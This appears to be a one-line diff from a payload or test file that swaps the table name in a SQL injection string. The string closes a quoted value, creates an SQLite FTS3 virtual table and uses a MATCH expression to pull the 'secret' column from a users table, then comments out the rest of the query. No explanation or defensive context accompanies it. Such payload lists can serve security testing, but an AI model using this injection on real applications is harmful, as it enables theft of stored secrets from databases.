@@ -8,4 +8,4 @@
 
 
 
-'; CREATE VIRTUAL TABLE sfdag USING fts3(x); SELECT 1,2,3 FROM sfdag WHERE sfdag MATCH '"'||substr((select secret from users limit 1),0); --
+'; CREATE VIRTUAL TABLE poi USING fts3(x); SELECT 1,2,3 FROM poi WHERE poi MATCH '"'||substr((select secret from users limit 1),0); --
